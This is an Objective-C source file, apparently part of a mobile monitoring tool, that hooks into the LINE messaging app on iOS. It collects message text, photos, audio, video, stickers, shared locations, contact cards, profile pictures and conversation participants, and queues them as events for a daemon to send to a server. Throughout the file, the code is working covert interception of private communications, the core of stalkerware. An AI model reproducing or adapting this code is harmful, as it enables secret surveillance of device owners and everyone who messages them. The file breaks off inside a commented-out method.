//
//  LINEUtils.m
//  MSFSP
//
//  Created by Makara Khloth on 11/27/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "LINEUtils.h"
#import "LineLocation.h"
#import "TalkUserObject.h"
#import "TalkImageCacheManager.h"
#import "TalkUserDefaultManager.h"
#import "TalkUtil.h"
#import "ContactModel.h"
#import "NLAudioURLLoader.h"

#import "DefStd.h"
#import "FxIMEvent.h"
#import "FxRecipient.h"
#import "FxIMGeoTag.h"
#import "FxAttachment.h"
#import "FxEventEnums.h"
#import "MessagePortIPCSender.h"
#import "StringUtils.h"
#import "DaemonPrivateHome.h"
#import "DateTimeFormat.h"

#import "LINEEventSenderOperation.h"


static LINEUtils *_LINEUtils = nil;



// image filename will be user id
static NSString * const kLineImageProfilePath		= @"Caches/Profile/os.line.naver.jp/80/os/p/";

// image filename will be in the folder named 'USER_ID'. The image name is preview
static NSString * const kLineImagePreviewPath		= @"Caches/Profile/Preview/os.line.naver.jp/80/os/p/";

// sticker package will be in the below format
// e.g., 2.100.linestk
//		2	:	package id
//		100	:	version
static NSString * const kLineDownloadedStickerPath	= @"Application Support/Sticker Packages";

static NSString * const kLineIncomingStickerPath	= @"Caches/Stray Sticker Packages";

static NSString * const kLineMessageAttachmentPath	= @"Application Support/Message Attachment";


#define kAudioDownloadDelay							10

@interface LINEUtils (private)

//- (void) thread: (FxIMEvent *) aIMEvent;

// Photo Attachment
+ (FxAttachment *) createPhotoAttachment: (NSData *) aImageData thumbnail: (NSData *) aThumbnailData;
+ (NSString *) createTimeStamp;
+ (NSString *) getOutputPath: (NSString *) aOutputPathWithoutExtension 
				   extension: (NSString *) aExtension;

// Audio/Video Attachment
+ (FxAttachment *) createAudioVideoAttachmentForData: (NSData *) aAudioData 
									   fileExtension: (NSString *) aExtension;

// Audio
+ (void) sendLINEInfo: (NSDictionary *) aLineInfo;

// Sticker
+ (NSString *) findStickerFolderNameForStickerPackageID: (NSString *) aStickerPackageID stickerPackagesPath: (NSString *) aStickerPackagesPath;
+ (NSString *) getStickerFolderPathForPackageIDIfExist: (NSString *) aStickerPackageID;
+ (NSData *) getStickerDataForStickerID: (NSInteger) aStickerID
					   stickerPackageID: (NSString *) aStickerPackageID
				  stickerPackageVersion: (unsigned) aStickerPackageVersion;
+ (FxAttachment *) createStickerAttachment: (NSData *) aStickerData;

@end


@implementation LINEUtils

@synthesize mLineEventSenderQueue;

+ (LINEUtils *) shareLINEUtils {
	if (_LINEUtils == nil) {
		_LINEUtils = [[LINEUtils alloc] init];	
		
		// -- create NSOperation queue for sending part		
		NSOperationQueue *queue = [[NSOperationQueue alloc] init];
		[queue setMaxConcurrentOperationCount:1];				
		[_LINEUtils setMLineEventSenderQueue:queue];
		[queue release];
		queue = nil;
	}
	return (_LINEUtils);
}

- (void) addOperationWithIMEvent: (FxIMEvent *) aIMEvent {
	DLog (@"=====> background thread %@ priority %f", [NSThread currentThread], [NSThread threadPriority])
	NSOperationQueue *queue			= [[LINEUtils shareLINEUtils] mLineEventSenderQueue];	
	LINEEventSenderOperation *op	= [[LINEEventSenderOperation alloc] initWithIMEvent:aIMEvent];
	[queue addOperation:op];
	[op release];
	op = nil;
}

+ (void) sendLINEEvent: (FxIMEvent *) aIMEvent {

	/* -------------------------------------------------------------
		This is not used because message port cannot process in time.
		Some event are lost because it doesn't arrive the Daemon
	 --------------------------------------------------------------*/
	//	LINEUtils *lineUtils = [[LINEUtils alloc] init];	
	//	[NSThread detachNewThreadSelector:@selector(thread:)
	//							 toTarget:lineUtils withObject:aIMEvent];	
	//	[lineUtils autorelease];
	DLog (@"=====> line thread %@ priority %f", [NSThread currentThread], [NSThread  threadPriority])
	[[LINEUtils shareLINEUtils] performSelectorInBackground:@selector(addOperationWithIMEvent:) withObject:aIMEvent];
	
}

//+ (UIImage *) imageWithImage: (UIImage *) image scaledToSize: (CGSize) newSize {
//    //UIGraphicsBeginImageContext(newSize);
//    UIGraphicsBeginImageContextWithOptions(newSize, NO, 0.0);
//    [image drawInRect:CGRectMake(0, 0, newSize.width, newSize.height)];
//    UIImage *newImage = UIGraphicsGetImageFromCurrentImageContext();    
//    UIGraphicsEndImageContext();
//    return newImage;
//}

+ (FxRecipient *) createFxRecipientWithTalkUserObject: (TalkUserObject *) aTalkUserObject {
	FxRecipient *participant = [LINEUtils createFxRecipientWithMID:[aTalkUserObject mid]
															  name:[aTalkUserObject displayUserName]
													 statusMessage:[aTalkUserObject statusMessage]];	
	return participant;
}

+ (FxRecipient *) createFxRecipientWithMID: (NSString *) aMID
									  name: (NSString *) aName
							 statusMessage: (NSString *) aStatusMessage {
	NSData *imageProfileData = [[NSData alloc] initWithData:[LINEUtils getContactPictureProfile:aMID]];		
	FxRecipient *participant = [LINEUtils createFxRecipientWithMID:aMID
															  name:aName
													 statusMessage:aStatusMessage
												  imageProfileData:imageProfileData];	
	[imageProfileData release];	
	return participant;
}

+ (FxRecipient *) createFxRecipientWithMID: (NSString *) aMID
									  name: (NSString *) aName
							 statusMessage: (NSString *) aStatusMessage 
						  imageProfileData: (NSData *) aImageProfileData {
	FxRecipient *participant = [[FxRecipient alloc] init];			
	[participant setRecipNumAddr:aMID];		
	[participant setRecipContactName:aName];		
	[participant setMStatusMessage:aStatusMessage];	
	[participant setMPicture:aImageProfileData];
	DLog (@"recipient number/id %@", aMID)				
	DLog (@"recipient name %@", aName)
	DLog (@"status message: %@", aStatusMessage)
	DLog (@"aImageProfileData: %d", [aImageProfileData length])
	return [participant autorelease];
}

+ (BOOL) isLineVersionIsEqualOrGreaterThan: (float) aVersion {
	NSString *bundleVersionString =  [[NSBundle mainBundle] objectForInfoDictionaryKey:(NSString *)kCFBundleVersionKey];	// e.g, 3.5.0, 3.2.1	
	// get first 2 digig
	NSArray *versionComponent = [bundleVersionString componentsSeparatedByString:@"."];
	NSString *twoDigitVersionString = [[NSString alloc] initWithFormat:@"%@.%@", [versionComponent objectAtIndex:0], [versionComponent objectAtIndex:1]];
	
	// compare with float aVersion
	float twoDigitVersionFloat = [twoDigitVersionString floatValue];
	DLog (@"LINE version %f", twoDigitVersionFloat)


	return (twoDigitVersionFloat >= aVersion) ? YES : NO;
}

+ (FxIMGeoTag *) getIMGeoTax: (LineLocation *) aLineLocation {	
	FxIMGeoTag *imGeoTag = nil;
	if (aLineLocation					&& 
		[aLineLocation longitudeIsSet]	&&
		[aLineLocation latitudeIsSet]	){
		
		float hor				= -1;			
		NSString *locationPlace	= [[NSString alloc] initWithString:[aLineLocation title]];				
		if ([locationPlace isEqualToString: @"Location"]) {
			[locationPlace release];
			locationPlace = [[NSString alloc] initWithString:[aLineLocation address]];
		}		
		
		imGeoTag				= [[FxIMGeoTag alloc] init];			
		[imGeoTag setMLatitude:(float)[aLineLocation latitude]];
		[imGeoTag setMLongitude:(float)[aLineLocation longitude]];			
		[imGeoTag setMHorAccuracy:hor];	// default value when cannot get information	
		[imGeoTag setMPlaceName:locationPlace];
		
		DLog (@"imGeoTag %@", imGeoTag)
				
		[locationPlace release];			
	}
	return [imGeoTag autorelease];
}

+ (NSData *) getContactPictureProfile: (NSString *) aContactMID {
	NSData *imageData = nil;
	
	// -- search in the part of actual image profile.
	// -- if not exist, search in the part of preview image profile
	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSLibraryDirectory, NSUserDomainMask, YES);	
	if ([paths count] == 1) {
		
		NSString *actualPicturePath			= [[paths objectAtIndex:0] stringByAppendingPathComponent:kLineImageProfilePath];
		actualPicturePath					= [actualPicturePath stringByAppendingPathComponent:aContactMID];	
		DLog (@"path 2 %@", actualPicturePath)
		NSFileManager *fileManager			= [[NSFileManager alloc] init];
		
		if ([fileManager fileExistsAtPath:actualPicturePath]) {		// -- Actual picture proflie exists, so use it
			DLog (@">>> Actual Image profile")
			
			imageData						= [[NSData alloc] initWithContentsOfFile:actualPicturePath];	// Note that the actual contact image profile will be existed only when the user open their image profile			
			//[imageData writeToFile:@"/tmp/out1.jpg" atomically:0];
		} else {													// -- use preview picture profile instead
			DLog (@">>> Preview Image profile")
			NSString *previewPicturePath	=  [[paths objectAtIndex:0] stringByAppendingPathComponent:kLineImagePreviewPath];
			previewPicturePath				= [previewPicturePath stringByAppendingPathComponent:aContactMID];
			previewPicturePath				= [previewPicturePath stringByAppendingPathComponent:@"preview"];
			DLog (@"path 2 %@", previewPicturePath)			
			if ([fileManager fileExistsAtPath:previewPicturePath]) {
				imageData					= [[NSData alloc] initWithContentsOfFile:previewPicturePath];			
				//[imageData writeToFile:@"/tmp/out2.jpg" atomically:0];
			}
		}						
		[fileManager release];		
	}		
	return [imageData autorelease];
}

+ (NSData *) getOwnerPictureProfile: (NSString *) aOwnerUID {
		Class $TalkImageCacheManager	= objc_getClass("TalkImageCacheManager");
		Class $TalkUserDefaultManager	= objc_getClass("TalkUserDefaultManager");
		Class $TalkUtil					= objc_getClass("TalkUtil");		
		UIImage *image					= [[$TalkImageCacheManager sharedManager] imageForURL:[$TalkUserDefaultManager profileImage]];	
		NSData *imageData				= nil;
		DLog (@"image %@", image)
	
		if (image) {	
			DLog (@">>> Getting owner profile case 1")
			UIImage *resizedImage		= [$TalkUtil resizeImage:image to:CGSizeMake(image.size.width/2, image.size.height/2)];
			imageData					= UIImageJPEGRepresentation(resizedImage, 0);	
			//DLog (@"imageData %@", imageData)
			//DLog (@"[$TalkUserDefaultManager profileImage]] %@", [$TalkUserDefaultManager profileImage])
			//[imageData writeToFile:@"/tmp/ownerPicture.jpg" atomically:0];
		} else {
			DLog (@">>> Getting owner profile case 2")
			imageData = [LINEUtils getContactPictureProfile: aOwnerUID];
		}	
	return imageData;	
}

+ (BOOL) isUnSupportedContentType: (LineContentType) aLineContentType {
	BOOL isUnSupported = NO;
	if (//aLineContentType == kLINEContentTypeImage				||
		//aLineContentType == kLINEContentTypeVideo				||	
		//aLineContentType == kLINEContentTypeAudioMessage		||	
		aLineContentType == kLINEContentTypeCall				//||	/// TODO: call
		//aLineContentType == kLINEContentTypeSticker			||
		//aLineContentType == kLINEContentTypeContact				
		){	/// TODO: contact	
		isUnSupported = YES;
	}
	return isUnSupported;
}		

// Assign conversation profile picture to be contact profile picture in the case of individual conversation
+ (BOOL) isIndividualConversationForChatType: (NSNumber *) aChatType participants: (NSArray *) aParticipants {
	BOOL isIndividualConversation = NO;
	DLog (@"chat type (0:ind 1:many 2:group) : %@", aChatType )		
	if ([aChatType intValue] == 0		&&					// for individual
		[aParticipants count] != 0		){
		DLog (@">> assign conversation picture")
		isIndividualConversation = YES;
	}
	return isIndividualConversation;	
}
 


#pragma mark Any Content Type


+ (void) sendAnyContentTypeEventUserID: (NSString *) aUserID						// user id
					   userDisplayName: (NSString *) aUserDisplayName				// user display name
					 userStatusMessage: (NSString *) aUserStatusMessage				// user status message
				userProfilePictureData: (NSData *) aUserProfilePictureData			// user profile picture
						  userLocation: (FxIMGeoTag *) aUserLocation

				 messageRepresentation: (FxIMMessageRepresentation) aMessageRepresentation
							   message: (NSString *) aMessage
							 direction: (FxEventDirection) aDirection				// direction

						conversationID: (NSString *) aConversationID				// conversation id
					  conversationName: (NSString *) aConversationName				// conversation name
			conversationProfilePicture: (NSData *) aConversationProfilePicture		// conversation profile pic

						  participants: (NSArray *) aParticipants														

						   attachments: (NSArray *) aAttachments

						 shareLocation: (FxIMGeoTag *) aSharedLocation {		
	NSString *imServiceId				= @"lin";	
	
	/********************************
	 *			FxIMEvent [ANY]
	 ********************************/

	FxIMEvent *imEvent			= [[FxIMEvent alloc] init];
	[imEvent setDateTime:[DateTimeFormat phoenixDateTime]];	
	
	[imEvent setMIMServiceID:imServiceId];						// specific to IM application
	[imEvent setMServiceID:kIMServiceLINE];						// specific to IM application
	
	[imEvent setMDirection:(FxEventDirection) aDirection];
	[imEvent setMRepresentationOfMessage:aMessageRepresentation];		
	[imEvent setMMessage:aMessage];										
	// -- user
	[imEvent setMUserID:aUserID];
	[imEvent setMUserDisplayName:aUserDisplayName];
	[imEvent setMUserStatusMessage:aUserStatusMessage];
	[imEvent setMUserPicture:aUserProfilePictureData];
	[imEvent setMUserLocation:aUserLocation];
	// -- conversation
	[imEvent setMConversationID:aConversationID];
	[imEvent setMConversationName:aConversationName];
	[imEvent setMConversationPicture:aConversationProfilePicture];		
	// -- participant
	[imEvent setMParticipants:aParticipants];
	// -- attachment
	[imEvent setMAttachments:aAttachments];	
	// -- share location	
	[imEvent setMShareLocation:aSharedLocation];	
	
	[LINEUtils sendLINEEvent:imEvent];
	[imEvent release];	
}


#pragma mark Image


+ (void) sendImageContentTypeEventUserID: (NSString *) aUserID						// user id
						 userDisplayName: (NSString *) aUserDisplayName				// user display name
					   userStatusMessage: (NSString *) aUserStatusMessage			// user status message
				  userProfilePictureData: (NSData *) aUserProfilePictureData		// user profile picture

							   direction: (FxEventDirection) aDirection				// direction
						
						  conversationID: (NSString *) aConversationID				// conversation id
						conversationName: (NSString *) aConversationName			// conversation name
			  conversationProfilePicture: (NSData *) aConversationProfilePicture	// conversation profile pic

							participants: (NSArray *) aParticipants														

							   photoData: (NSData *) aPhotoData
						   thumbnailData: (NSData *) aThumbnailData {
	NSAutoreleasePool *pool		= [[NSAutoreleasePool alloc] init];

	FxAttachment *attachment	= [LINEUtils createPhotoAttachment:aPhotoData thumbnail: aThumbnailData];

	NSArray *attachments		= [[NSArray alloc] initWithObjects:attachment, nil];

	[pool drain];
		
	/********************************
	 *			FxIMEvent [Image]
	 ********************************/

	[LINEUtils sendAnyContentTypeEventUserID:aUserID
							 userDisplayName:aUserDisplayName 
						   userStatusMessage:aUserStatusMessage
					  userProfilePictureData:aUserProfilePictureData 
								userLocation:nil 
					   messageRepresentation:kIMMessageNone								
									 message:nil										// No message for image
								   direction:aDirection 
							  conversationID:aConversationID 
							conversationName:aConversationName 
				  conversationProfilePicture:aConversationProfilePicture 
								participants:aParticipants 
								 attachments:attachments
							   shareLocation:nil];					// one photo as an attachment
	[attachments release];
	attachments = nil;
}


#pragma mark Audio


+ (void) sendAudioContentTypeEventUserID: (NSString *) aUserID						// user id
						 userDisplayName: (NSString *) aUserDisplayName				// user display name
					   userStatusMessage: (NSString *) aUserStatusMessage			// user status message
				  userProfilePictureData: (NSData *) aUserProfilePictureData		// user profile picture

							   direction: (FxEventDirection) aDirection				// direction

						  conversationID: (NSString *) aConversationID				// conversation id
						conversationName: (NSString *) aConversationName			// conversation name
			  conversationProfilePicture: (NSData *) aConversationProfilePicture	// conversation profile pic

							participants: (NSArray *) aParticipants														

							   audioPath: (NSString *) aAudioPath {
	/********************************
	 *			FxIMEvent [Audio]
	 ********************************/
	
	/* get audio data from the line application
	 * For outgoing audio, it is saved in APPFOLDER/tmp/xxxx.m4a
	 * For incoming audio, it is saved in APPFOLDER/Library/Application Support/Message Attachment/USERID/xxxx.mp4
	 */	
	// -- OUTGOING -----------------------------------------------------------------------------------
	if (aDirection == kEventDirectionOut) {
		NSAutoreleasePool *pool		= [[NSAutoreleasePool alloc] init];		
		NSString *pathExtension		= [aAudioPath pathExtension];
		
		// e.g., /private/var/mobile/Applications/5E3BEFC5-134F-4797-AF36-0F2425C89E50/tmp/_131076.m4a
		NSData *audioData			= [[NSData alloc] initWithContentsOfFile:aAudioPath];		
		FxAttachment *attachment	= [LINEUtils createAudioVideoAttachmentForData:audioData 
																     fileExtension:pathExtension];
		[audioData release];
		audioData = nil;
		NSArray *attachments		= [[NSArray alloc] initWithObjects:attachment, nil];		
		[pool drain];				
		[LINEUtils sendAnyContentTypeEventUserID:aUserID
								 userDisplayName:aUserDisplayName 
							   userStatusMessage:aUserStatusMessage
						  userProfilePictureData:aUserProfilePictureData 
									userLocation:nil 
						   messageRepresentation:kIMMessageNone								
										 message:nil										// No message for image
									   direction:aDirection 
								  conversationID:aConversationID 
								conversationName:aConversationName 
					  conversationProfilePicture:aConversationProfilePicture 
									participants:aParticipants 
									 attachments:attachments
								   shareLocation:nil];					
		[attachments release];
		attachments = nil;		
	} 	
	// -- INCOMING -----------------------------------------------------------------------------------
	else {
		//APPFOLDER/Library/Application Support/Message Attachment/USERID/xxxx.mp4
		DLog (@">>>>> INCOMING aAudioPath %@", aAudioPath)		
		
		// -- AUDIO FILE HAS BEEN DOWNLOADED
		if ([[NSFileManager defaultManager] fileExistsAtPath:aAudioPath]) {
			DLog (@">>>>> File exists")
			NSAutoreleasePool *pool		= [[NSAutoreleasePool alloc] init];
			NSData *audioData			= [[NSData alloc] initWithContentsOfFile:aAudioPath];
			NSString *pathExtension		= [aAudioPath pathExtension];			
			FxAttachment *attachment	= [LINEUtils createAudioVideoAttachmentForData:audioData
																		 fileExtension:pathExtension];	
			[audioData release];
			audioData = nil;
			NSArray *attachments		= [[NSArray alloc] initWithObjects:attachment, nil];
			DLog (@"attachments %@", attachments)
			[pool drain];
							
			[LINEUtils sendAnyContentTypeEventUserID:aUserID
									 userDisplayName:aUserDisplayName 
								   userStatusMessage:aUserStatusMessage
							  userProfilePictureData:aUserProfilePictureData 
										userLocation:nil 
							   messageRepresentation:kIMMessageNone								
											 message:nil										// No message for image
										   direction:aDirection 
									  conversationID:aConversationID 
									conversationName:aConversationName 
						  conversationProfilePicture:aConversationProfilePicture 
										participants:aParticipants 
										 attachments:attachments
									   shareLocation:nil];				
			[attachments release];
			attachments = nil;
			
		} 
		// -- AUDIO FILE HAS "NOT" BEEN DOWNLOADED
		else {		
			DLog (@"***********************************")
			DLog (@"NOT FOUND AUDIO, so send only mime type")
			DLog (@"***********************************")		
			FxAttachment *attachment = [[FxAttachment alloc] init];
			[attachment setFullPath:@"audio/mp4"];				// hard code mime type					
			NSArray *attachments		= [[NSArray alloc] initWithObjects:attachment, nil];
			
			[LINEUtils sendAnyContentTypeEventUserID:aUserID
									 userDisplayName:aUserDisplayName 
								   userStatusMessage:aUserStatusMessage
							  userProfilePictureData:aUserProfilePictureData 
										userLocation:nil 
							   messageRepresentation:kIMMessageNone								
											 message:nil										// No message for image
										   direction:aDirection 
									  conversationID:aConversationID 
									conversationName:aConversationName 
						  conversationProfilePicture:aConversationProfilePicture 
										participants:aParticipants 
										 attachments:attachments
									   shareLocation:nil];				
			[attachments release];
			attachments = nil;
			
		}
	}
}


+ (void) send2AudioContentTypeEventUserID: (NSString *) aUserID						// user id
						 userDisplayName: (NSString *) aUserDisplayName				// user display name
					   userStatusMessage: (NSString *) aUserStatusMessage			// user status message
				  userProfilePictureData: (NSData *) aUserProfilePictureData		// user profile picture

							   direction: (FxEventDirection) aDirection				// direction

						  conversationID: (NSString *) aConversationID				// conversation id
						conversationName: (NSString *) aConversationName			// conversation name
			  conversationProfilePicture: (NSData *) aConversationProfilePicture	// conversation profile pic

							participants: (NSArray *) aParticipants														

							   audioPath: (NSString *) aAudioPath {
	
	DLog (@"====== constructing dictionary of line info =====")
	NSMutableDictionary *lineInfo = [[NSMutableDictionary alloc] initWithObjectsAndKeys:aUserID, kLineUserIdKey, nil];
	if (aUserDisplayName)			[lineInfo setObject:aUserDisplayName forKey:kLineUserDisplayNameKey];			
	if (aUserStatusMessage)			[lineInfo setObject:aUserStatusMessage forKey:kLineUserStatusMessageKey];
	if (aUserProfilePictureData)	[lineInfo setObject:aUserProfilePictureData forKey:kLineSenderImageProfileDataKey];			
	[lineInfo setObject:[NSNumber numberWithInt:aDirection] forKey:kLineDirectionKey];			
	if (aConversationID)			[lineInfo setObject:aConversationID forKey:kLineConversationIDKey];
	if (aConversationName)			[lineInfo setObject:aConversationName forKey:kLineConversationNameKey];						
	if (aConversationProfilePicture)	[lineInfo setObject:aConversationProfilePicture forKey:kLineConversationProfilePicDataKey];
	if (aParticipants)				[lineInfo setObject:aParticipants forKey:kLineParticipantsKey];
	if (aAudioPath)					[lineInfo setObject:aAudioPath forKey:kLineAudioPathKey];			
	DLog (@"--->>>>> lineInfo %@", lineInfo)
	
	[NSThread detachNewThreadSelector:@selector(sendLINEInfo:) 
							 toTarget:[LINEUtils class]
						   withObject:lineInfo];
	[lineInfo release];	
}

+ (void) sendLINEInfo: (NSDictionary *) aLineInfo {
	NSString *userId				= [aLineInfo objectForKey:kLineUserIdKey];
	NSString *userDisplayName		= [aLineInfo objectForKey:kLineUserDisplayNameKey];
	NSString *userStatusMessage		= [aLineInfo objectForKey:kLineUserStatusMessageKey];
	NSData *senderImageProfileData	= [aLineInfo objectForKey:kLineSenderImageProfileDataKey];
	FxEventDirection direction		=  (FxEventDirection) [[aLineInfo objectForKey:kLineDirectionKey] intValue];	
	NSString *conversationID		= [aLineInfo objectForKey:kLineConversationIDKey];
	NSString *conversationName		= [aLineInfo objectForKey:kLineConversationNameKey];
	NSData *conversationProfilePicData = [aLineInfo objectForKey:kLineConversationProfilePicDataKey];	
	NSArray *participants			= [aLineInfo objectForKey:kLineParticipantsKey];
	NSString *audioPath				= [aLineInfo objectForKey:kLineAudioPathKey];
	
	[NSThread sleepForTimeInterval:kAudioDownloadDelay];
	
	DLog (@"!!!!!!!!!!!!!! sendAudioContentTypeEventUserID !!!!!!!!!!!")
	[LINEUtils sendAudioContentTypeEventUserID:userId
							   userDisplayName:userDisplayName
							 userStatusMessage:userStatusMessage
						userProfilePictureData:senderImageProfileData 
									 direction:direction 
								conversationID:conversationID
							  conversationName:conversationName
					conversationProfilePicture:conversationProfilePicData
								  participants:participants 
									 audioPath:audioPath];
	
}

+ (void) loadAudio: (id) aMessageID {
	DLog (@"!!!!!!!!!!!!!!!!!!!!!!! loading audio !!!!!!!!!!!!!!!!!!")
	Class $NLAudioURLLoader		= objc_getClass("NLAudioURLLoader");
	NLAudioURLLoader *loader	= [[$NLAudioURLLoader alloc] init];
	[loader loadAudioWithObjectID:aMessageID knownDownloadURL:nil];
	[loader release];
}

#pragma mark Video

+ (void) sendVideoContentTypeEventUserID: (NSString *) aUserID						// user id
						 userDisplayName: (NSString *) aUserDisplayName				// user display name
					   userStatusMessage: (NSString *) aUserStatusMessage			// user status message
				  userProfilePictureData: (NSData *) aUserProfilePictureData		// user profile picture

							   direction: (FxEventDirection) aDirection				// direction

						  conversationID: (NSString *) aConversationID				// conversation id
						conversationName: (NSString *) aConversationName			// conversation name
			  conversationProfilePicture: (NSData *) aConversationProfilePicture	// conversation profile pic

							participants: (NSArray *) aParticipants	
							   audioPath: (NSString *) aAudioPath {
	
	/********************************
	 *			FxIMEvent [Video]
	 ********************************/
			
	/* get audio data from the line application
	 * For outgoing video, it is saved in APPFOLDER/tmp/
	 * For incoming video, it is saved in APPFOLDER/Library/Application Support/Message Attachment/USERID/xxxx.mp4
	 */	
	if (aDirection == kEventDirectionOut) {
	
		NSAutoreleasePool *pool		= [[NSAutoreleasePool alloc] init];
		
		//NSString *tempDir = NSTemporaryDirectory();
		//DLog (@"tempDir %@", tempDir)
		
		// e.g., /private/var/mobile/Applications/5E3BEFC5-134F-4797-AF36-0F2425C89E50/tmp/trim.phvP9N.MOV
		NSData *audioData			= [[NSData alloc] initWithContentsOfFile:aAudioPath];			
		FxAttachment *attachment	= [LINEUtils createAudioVideoAttachmentForData:audioData 
																	 fileExtension:@"MOV"];		
		NSArray *attachments		= [[NSArray alloc] initWithObjects:attachment, nil];		
		[pool drain];
				
		[LINEUtils sendAnyContentTypeEventUserID:aUserID
								 userDisplayName:aUserDisplayName 
							   userStatusMessage:aUserStatusMessage
						  userProfilePictureData:aUserProfilePictureData 
									userLocation:nil 
						   messageRepresentation:kIMMessageNone								
										 message:nil										// No message for video
									   direction:aDirection 
								  conversationID:aConversationID 
								conversationName:aConversationName 
					  conversationProfilePicture:aConversationProfilePicture 
									participants:aParticipants 
									 attachments:attachments
								   shareLocation:nil];			
		[attachments release];
		attachments = nil;
		
	} 	
	else {
		DLog (@"***********************************")
		DLog (@"NOT FOUND VIDEO, so not send event to the server")
		DLog (@"***********************************")
		
		FxAttachment *attachment = [[FxAttachment alloc] init];
		[attachment setFullPath:@"video/mp4"];				// hard code mime type
		
		NSArray *attachments		= [[NSArray alloc] initWithObjects:attachment, nil];
		
		[LINEUtils sendAnyContentTypeEventUserID:aUserID
								 userDisplayName:aUserDisplayName 
							   userStatusMessage:aUserStatusMessage
						  userProfilePictureData:aUserProfilePictureData 
									userLocation:nil 
						   messageRepresentation:kIMMessageNone								
										 message:nil										// No message for video
									   direction:aDirection 
								  conversationID:aConversationID 
								conversationName:aConversationName 
					  conversationProfilePicture:aConversationProfilePicture 
									participants:aParticipants 
									 attachments:attachments
								   shareLocation:nil];				
		[attachments release];
		attachments = nil;
		
	}
}


#pragma mark Contact


+ (void) sendContactContentTypeEventUserID: (NSString *) aUserID						// user id
						   userDisplayName: (NSString *) aUserDisplayName				// user display name
						 userStatusMessage: (NSString *) aUserStatusMessage			// user status message
					userProfilePictureData: (NSData *) aUserProfilePictureData		// user profile picture

								 direction: (FxEventDirection) aDirection				// direction

							conversationID: (NSString *) aConversationID				// conversation id
						  conversationName: (NSString *) aConversationName			// conversation name
				conversationProfilePicture: (NSData *) aConversationProfilePicture	// conversation profile pic

							  participants: (NSArray *) aParticipants														

							  contactModel: (ContactModel *) aContactModel {
	/********************************
	 *			FxIMEvent [Contact]
	 ********************************/
	
	//TalkUserObject *user		= [aContactModel userObjectWithMid:[aContactModel mid]];
	//NSString *lineName			= [user name]					?	[user name]: @"";
	//NSString *addressBookName	= [user addressbookName]		?	[user addressbookName]: @"";
	
	NSString *displayName		= [aContactModel displayName]	?	[aContactModel displayName] : @"" ;
	NSString *contactID			= [aContactModel mid]			?	[aContactModel mid] : @"";		
	NSString *contact			= [[NSString alloc] initWithFormat:@"Display Name: %@, Contact ID: %@", displayName, contactID];
	
	DLog (@"Display name %@",displayName)	
	DLog (@"contact %@", contact)
	[LINEUtils sendAnyContentTypeEventUserID:aUserID
							 userDisplayName:aUserDisplayName 
						   userStatusMessage:aUserStatusMessage
					  userProfilePictureData:aUserProfilePictureData 
								userLocation:nil 
					   messageRepresentation:kIMMessageContact								
									 message:contact										
								   direction:aDirection 
							  conversationID:aConversationID 
							conversationName:aConversationName 
				  conversationProfilePicture:aConversationProfilePicture 
								participants:aParticipants 
								 attachments:nil
							   shareLocation:nil];
	[contact release];
	
		
}


#pragma mark Shared Location


+ (void) sendSharedLocationContentTypeEventUserID: (NSString *) aUserID						// user id
								  userDisplayName: (NSString *) aUserDisplayName			// user display name
								userStatusMessage: (NSString *) aUserStatusMessage			// user status message
						   userProfilePictureData: (NSData *) aUserProfilePictureData		// user profile picture

										direction: (FxEventDirection) aDirection			// direction

								   conversationID: (NSString *) aConversationID				// conversation id
								 conversationName: (NSString *) aConversationName			// conversation name
					   conversationProfilePicture: (NSData *) aConversationProfilePicture	// conversation profile pic

									 participants: (NSArray *) aParticipants			

									shareLocation: (FxIMGeoTag *) aSharedLocation {
	
	/********************************
	 *			FxIMEvent [Share Location]
	 ********************************/
	
	[LINEUtils sendAnyContentTypeEventUserID:aUserID
							 userDisplayName:aUserDisplayName 
						   userStatusMessage:aUserStatusMessage
					  userProfilePictureData:aUserProfilePictureData 
								userLocation:nil 
					   messageRepresentation:kIMMessageShareLocation			
									 message:nil								
								   direction:aDirection 
							  conversationID:aConversationID 
							conversationName:aConversationName 
				  conversationProfilePicture:aConversationProfilePicture 
								participants:aParticipants 
								 attachments:nil
							   shareLocation:aSharedLocation];							
}


#pragma mark Sticker


+ (void) sendStickerContentTypeEventUserID: (NSString *) aUserID						// user id
						   userDisplayName: (NSString *) aUserDisplayName				// user display name
						 userStatusMessage: (NSString *) aUserStatusMessage				// user status message
					userProfilePictureData: (NSData *) aUserProfilePictureData			// user profile picture

								 direction: (FxEventDirection) aDirection				// direction

							conversationID: (NSString *) aConversationID				// conversation id
						  conversationName: (NSString *) aConversationName				// conversation name
				conversationProfilePicture: (NSData *) aConversationProfilePicture		// conversation profile pic

							  participants: (NSArray *) aParticipants			

								 stickerID: (NSInteger) aStickerID
						  stickerPackageID: (NSString *) aStickerPackageID
					 stickerPackageVersion: (unsigned) aStickerPackageVersion {	
	
	NSData *stickerData	= [LINEUtils getStickerDataForStickerID:aStickerID	
											   stickerPackageID:aStickerPackageID
										  stickerPackageVersion:aStickerPackageVersion];	
	if (stickerData) {
		FxAttachment *attachment	= [LINEUtils createStickerAttachment:stickerData];		
		NSArray *attachments		= [[NSArray alloc] initWithObjects:attachment, nil];
								
		/********************************
		 *			FxIMEvent [Sticker]
		 ********************************/
		
		[LINEUtils sendAnyContentTypeEventUserID:aUserID
								 userDisplayName:aUserDisplayName 
							   userStatusMessage:aUserStatusMessage
						  userProfilePictureData:aUserProfilePictureData 
									userLocation:nil 
						   messageRepresentation:kIMMessageSticker					// Sticker !!!
										 message:nil								// No message for Sticker
									   direction:aDirection 
								  conversationID:aConversationID 
								conversationName:aConversationName 
					  conversationProfilePicture:aConversationProfilePicture 
									participants:aParticipants 
									 attachments:attachments						// one Sticker in array
								   shareLocation:nil];
		[attachments release];
	} else {
		DLog (@"***********************************")
		DLog (@"NOT FOUND STICKER, so not send event to the server")
		DLog (@"***********************************")
	}
}

#pragma mark -
#pragma mark Private method
#pragma mark -

/*
- (void) thread: (FxIMEvent *) aIMEvent {		
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	@try {
		
		NSString *msg = [StringUtils removePrivateUnicodeSymbols:[aIMEvent mMessage]];
		DLog(@"LINE message after remove emoji = %@", msg);
		if ([msg length]															||	// for Text
			[aIMEvent mRepresentationOfMessage] == kIMMessageShareLocation			||	// for Share location
			([aIMEvent mAttachments] && [[aIMEvent mAttachments] count] != 0)		){	// for Image
			[aIMEvent setMMessage:msg];			
			NSMutableData* data = [[NSMutableData alloc] init];
			
			NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
			[archiver encodeObject:aIMEvent forKey:kLINEArchived];
